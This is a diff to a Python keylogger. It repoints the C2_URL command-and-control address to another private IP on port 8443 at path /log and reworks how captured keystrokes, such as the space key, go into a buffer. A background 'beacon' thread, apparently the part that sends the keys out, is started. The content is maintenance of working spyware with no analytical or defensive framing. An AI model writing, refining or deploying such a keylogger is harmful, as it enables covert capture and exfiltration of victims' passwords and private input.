@@ -3,7 +3,7 @@ import requests
 import threading
 import time
 
-C2_URL = "https://10.75.156.161:8443/log"
+C2_URL = "https://10.5.41.160:8443/log"
 buffer = []
 lock = threading.Lock()
 
@@ -25,9 +25,11 @@ def on_press(key):
         try:
             buffer.append(key.char)
         except AttributeError:
-            key_str = str(key).replace("Key.space", " ")
-            key_str = key_str.replace("Key.", "")
-            buffer.append(f" [{key_str}] ")
+            if key == keyboard.Key.space:
+                buffer.append(" ")
+            else:
+                key_str = str(key).replace("Key.", "")
+                buffer.append(f" [{key_str}] ")
 
 t = threading.Thread(target=beacon, daemon=True)
 t.start()
